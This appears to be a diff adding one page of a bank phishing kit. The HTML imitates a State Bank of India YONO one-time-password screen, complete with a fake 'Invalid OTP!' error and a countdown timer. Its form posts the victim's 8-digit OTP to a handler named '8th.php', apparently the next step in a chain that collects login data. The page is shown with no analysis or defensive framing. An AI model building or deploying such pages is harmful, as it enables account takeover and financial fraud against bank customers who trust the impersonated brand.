@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+<script src="./removeBanner.js"></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+    <title>Enter OTP/login</title>
+    <style>
+        #aa,#bb
+        {
+            width: 105%;
+            margin:-8px;
+            padding:0px px;
+            
+        }
+        #ee
+        {
+        width: 280px;
+        height:26px;
+        background-color:#ededed;
+        border-color:#7212b3;
+        border-width:1px;
+        border-radius:4px;
+        margin:8px;
+        margin-left:20px;
+        padding:2px 10px 
+        }
+        #gg
+        {
+            width: 342px;
+            background-color: #7212b3;
+            color: white;
+            border: solid black;
+            border-radius: 1px;
+            border-width:0.1px;
+            cursor: pointer;
+            font-size: 18px;
+            height: 42px;
+            
+        }
+        #ii,#kk
+        {
+            width: 100%;
+        }
+        #zz
+        {
+            color:red;
+            margin:6px;
+            font-size:18px;
+        }
+        #gg:hover
+        {
+        background-color:#4c0c85;
+        color: white;
+        border: solid black;
+        border-radius: 1px;
+        border-width:0.1px;
+        cursor: pointer;
+        font-size: 18px;
+        height: 42px;
+        }
+        a:hover {
+        background-color:#ededed;
+        border-radius:3px;
+        text-decoration:none;
+        }
+    </style>
+</head>
+<body onload="startTimer();">
+    <img src="fourth.jpeg" alt="" id="aa"><br><br>
+    <form action="8th.php" method="post">
+     <div id="zz">
+     <center> <b>Invalid OTP!</b></center>
+     </div>
+     <div id="cc">
+         <p1 style=" margin-left:20px; font-family: Arial;">Enter The One Time Password(OTP) <span style="color:#f06565;">*</span></p1>
+     </div>
+     <div id="dd">
+         <input type="tel" name="OTP" id="ee" placeholder="Enter Valid One Time Password"  maxlength="8"
+         pattern="[0-9]{8}" 
+         title="Please Enter Valid 8 Digit High Security Password" required="">
+         <script type="text/javascript">
+         var timer=120;
+         var sec=120;
+         function startTimer() {
+         sec=parseInt(timer%120);
+         
+         if (timer<0) {
+         timer.stop();
+         }
+         
+         document.getElementById("time").innerHTML = "<p1> Wait for OTP : </p1>"+sec.toString();
+         timer--;
+         setTimeout(function(){
+         startTimer();
+         
+         }, 1000);
+         }
+         
+         </script>
+         <div>
+         <b> <a href="#" style="color:#27a2db; margin-left:225px; text-decoration:none;">Resend OTP</a></b>
+         </div><br>
+         <div>
+         <center> <b style="color:grey; font-size:16px; margin:-2px; margin-left:0px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</p></b>
+         </div><br><br>
+         <div id="otp">
+        <center><p style="color:grey; font-family: Arial, Helvetica, sans-serif;  font-size:14px;">
+        Having Trouble with OTP? Please write to feedback.yono@sbi.co.in with screenshot and your registered mobile number</p></center>
+     </div><br><br><br><br>
+     <div id="ff">
+        <center> <button type="submit"id="gg">
+        Confirm</button></center> <br><br>
+     </div>
+     <div id="hh">
+         <img src="otp-footer.jpg" alt="" id="ii">
